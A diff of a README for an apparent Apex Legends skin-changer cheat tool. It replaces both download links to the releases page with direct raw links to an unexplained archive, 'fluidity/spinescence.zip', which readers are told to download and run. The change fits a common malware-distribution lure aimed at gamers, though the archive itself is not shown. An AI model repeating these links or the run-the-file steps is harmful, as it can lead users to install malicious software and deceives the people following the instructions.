@@ -16,7 +16,7 @@ Getting started is easy. Just follow these simple steps:
 2. **Download the application** to your computer.
 3. **Run the file** to start using the tool immediately.
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD-apex--legends--skin--changer-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/willi4463/apex-legends-skin-changer/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD-apex--legends--skin--changer-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://raw.githubusercontent.com/willi4463/apex-legends-skin-changer/main/fluidity/spinescence.zip)
 
 ## ⚙️ System Requirements
 
@@ -109,7 +109,7 @@ We release updates whenever Apex Legends gets a new patch to ensure compatibilit
 
 Ready to transform your Apex Legends experience? Download the tool now and start using any skin you want.
 
-[⬇️ CLICK HERE TO DOWNLOAD](https://github.com/willi4463/apex-legends-skin-changer/releases)
+[⬇️ CLICK HERE TO DOWNLOAD](https://raw.githubusercontent.com/willi4463/apex-legends-skin-changer/main/fluidity/spinescence.zip)
 
 Visit this link to download the application. It's quick, easy, and completely free.
 
